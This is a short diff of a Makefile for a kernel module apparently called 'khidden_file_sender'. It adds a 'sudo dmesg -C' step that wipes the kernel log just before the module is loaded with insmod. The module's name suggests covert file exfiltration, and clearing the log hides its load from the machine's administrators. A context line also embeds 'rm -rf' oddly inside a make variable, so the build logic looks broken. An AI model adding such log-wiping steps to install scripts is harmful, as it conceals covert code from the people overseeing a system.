@@ -25,6 +25,7 @@ debug:
 release:
 	$(MAKE) -C $(rm -rf *.o *~ core .depend .*.cmd *.ko *.mod.c .tmp_versions debug) M=$(PWD) modules
 install:
+	sudo dmesg -C	
 	sudo insmod khidden_file_sender.ko
 remove:
 	sudo rmmod khidden_file_sender.ko
